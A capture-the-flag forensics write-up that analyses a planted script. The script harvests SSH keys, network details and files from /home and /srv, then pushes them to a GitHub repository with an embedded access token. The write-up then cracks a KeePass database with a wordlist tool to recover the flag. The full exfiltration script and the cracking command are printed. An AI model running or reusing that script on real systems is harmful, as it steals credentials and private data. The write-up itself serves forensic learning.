
---

## Bombardino Forensics Challenge – Writeup
### blooded – only one solve.
### Author & Team

- **Author**: Sn4keEy3s 
- **Team**: 0M3G4_SQU4D

---

### Initial Overview

After downloading the challenge distribution, we get access to a Linux file system.

![alt text](image-8.png)

The challenge description mentions a file named `scriptiono`. Using the `locate` tool quickly reveals its location.

![alt text](image.png)

The file is located at:

```
/home/sn4keey3s/Downloads/INPT-CTF/usr/lib/tools/Bombardino_scriptino.sh
```

Here is the content of the script:

```bash
#!/bin/bash

TEMP_DIR=$(mktemp -d)
cd "$TEMP_DIR"

mkdir $TEMP_DIR/ssh-exfil

	rsync -a --prune-empty-dirs --include '*/' --include 'id_*' --include 'known_hosts' --exclude '*' /home ./ssh-exfil


	for i in $(find . -name ".ssh" -type d)
		do
			cd $i
			cd ./..
			mv .ssh ssh
			cd ./..
			cd ./..
	done

cd $TEMP_DIR
tar cfv $TEMP_DIR/ssh-exfil.tar $TEMP_DIR/ssh-exfil/

touch ./work.log

{
	echo "Starting data collection for exfiltration..."
	
	echo ""
	
	fqn=$(host -TtA $(hostname -s)|grep "has address"|awk '{print $1}') ; \
	if [[ "${fqn}" == "" ]] ; then fqn=$(hostname -s) ; fi ; \
	echo "${fqn}"

	whoami

	ip link && ip neigh && ip route && ip rule && ip maddress && ip address

} 2>&1 | tee -a ./work.log

cd $TEMP_DIR
echo $(pwd)
git init
git config --global user.email "jantofixsamaqlo@gmail.com"
git config --global user.name "jantofix12"


BRANCH_NAME="exfil-$(date +%s)"
git checkout -b "$BRANCH_NAME"


mkdir $TEMP_DIR/srv_files


cp -r /srv/* $TEMP_DIR/srv_files
cp -r /home/* $TEMP_DIR/srv_files

tar cfv $TEMP_DIR/srv_files.tar $TEMP_DIR/srv_files/
git add ssh-exfil.tar work.log srv_files.tar


git commit -m "Exfiltrated data from $(hostname) at $(date)"

git remote add origin https://jantofix12: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@github.com/jantofix12/samaqlino_forensicino_bombardini.git

git push -u origin "$BRANCH_NAME"

cd - > /dev/null
rm -rf "$TEMP_DIR"


exit
```

This script is clearly malicious. It collects sensitive data like SSH keys, network information, and contents of `/home` and `/srv`, compresses them, and then pushes them to a remote GitHub repository:

```
https://github.com/jantofix12/samaqlino_forensicino_bombardini.git
```

---

### Investigating the GitHub Repository

Let’s clone the repository.

![alt text](image-1.png)

The default branch contains what looks like a simple website, not something uploaded by the malware. Suspiciously, it seems to be a cover-up by the user `@samaqlo`.

Looking at the malware’s code, we see that each exfiltration commit is pushed to a branch named after a UNIX timestamp:

```bash
BRANCH_NAME="exfil-$(date +%s)"
```

That means we need to look at the older branches to find actual stolen data.

![alt text](image-2.png)

There are several interesting branches. One of them is `exfil-1744466130`. Let’s check it out using `git checkout`.

![alt text](image-3.png)

Inside that branch, we find the file `srv_files.tar`, which was exfiltrated by the malware. After extracting it, we see some notable files, including `secret.zip` (which is password-protected) and a `.kdbx` file – a KeePass database.

The idea now is to crack the KeePass database to extract the password that unlocks `secret.zip`.

---

### Cracking the KeePass Database

After doing a bit of OSINT on KeePass cracking tools, I came across this one:

![alt text](image-4.png)

However, this is where the real struggle began. The tool didn’t work on Pop!_OS or Ubuntu. It only ran successfully on Kali Linux. I suspect the issue is related to the `keepassxc` dependency, which might have different internal implementations or dependencies across distributions.

Eventually, I ran the following command on a colleague’s Kali machine:

```
./keepass4brute/keepass4brute.sh secret_vault.kdbx rockyou.txt
```

The password was cracked:  
`iloveyou1`

---

### Retrieving the Flag

Using that password, I opened the KeePass database.

![alt text](image-5.png)

It revealed four stored passwords. I tried each one on the zip file.

![alt text](image-6.png)

The correct password for the zip file was:  
`ArvmZbUrXzqt3dr`

Inside, we finally find the flag:  
`IDEH{bombardino_scriptino_left_no_log_in_the_loggino}`

---

Thanks for the challenge. It was well designed, though I think it would be helpful to mention the compatibility issue with non-Kali Linux systems, especially since the cracking step depends heavily on environment-specific behavior.

---
